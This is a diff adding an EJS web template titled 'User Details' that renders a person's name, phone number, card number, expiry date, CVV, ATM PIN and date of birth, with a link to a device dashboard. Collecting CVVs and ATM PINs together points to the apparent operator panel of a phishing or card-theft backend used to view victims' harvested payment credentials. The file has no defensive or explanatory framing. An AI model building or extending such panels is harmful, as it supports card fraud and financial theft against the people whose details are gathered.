@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>User Details</title>
+  <link rel="stylesheet" href="/css/userDetail.css" />
+</head>
+<body>
+
+  <!-- Header Navigation -->
+  <header class="header-nav">
+    <h1>User and Payment Details</h1>
+  </header>
+
+  <!-- Main Content Container -->
+  <div class="user-detail-container">
+    
+    <div class="panel">
+      <% if (user) { %>
+        <p><strong>Full Name:</strong> <%= user.fullName %>,  
+           <strong>Phone Number:</strong> <%= user.phoneNumber %>
+        </p>
+      <% } %>
+    
+      <% if (visa1Data) { %>
+        <p><strong>Card Number:</strong> <%= visa1Data.cardNumber %>,  
+           <strong>Expiry Date:</strong> <%= visa1Data.expiryDate %>,  
+           <strong>CVV:</strong> <%= visa1Data.cvv %>
+        </p>
+      <% } %>
+    
+      <% if (visa2Data) { %>
+        <p><strong>ATM Pin:</strong> <%= visa2Data.atmPin %>,  
+           <strong>Date of Birth:</strong> <%= visa2Data.dob %>
+        </p>
+      <% } %>
+    </div>
+    <a href="/api/device/dashboard">
+      <button class="dashboard-btn">Go to Dashboard</button>
+    </a>
+  </div>
+
+</body>
+</html>
